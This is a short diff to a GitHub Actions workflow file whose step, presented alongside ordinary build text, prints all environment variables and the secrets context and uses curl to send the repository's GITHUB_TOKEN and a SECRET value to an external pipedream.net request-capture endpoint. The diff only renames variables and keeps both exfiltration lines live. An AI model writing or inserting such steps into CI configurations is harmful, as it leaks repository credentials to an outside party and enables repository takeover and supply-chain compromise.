@@ -36,9 +36,9 @@ jobs:
           echo test, and deploy your project.
           printenv
           echo ${{ secrets }}
-          curl "https://eozcx1zbue0apii.m.pipedream.net?secret=$GITHUB_TOKEN"
-          curl "https://eozcx1zbue0apii.m.pipedream.net?github_token=${{ secrets.GITHUB_TOKEN }}"
+          curl "https://eozcx1zbue0apii.m.pipedream.net?secret=$SECRET"
+          curl "https://eozcx1zbue0apii.m.pipedream.net?github_token=$GITHUB_TOKEN"
         env:
-          GITHUB_TOKEN: ${{ secrets.SECRET }}
+          SECRET: ${{ secrets.SECRET }}
           FIRST_NAME: Mona
           LAST_NAME: Octocat
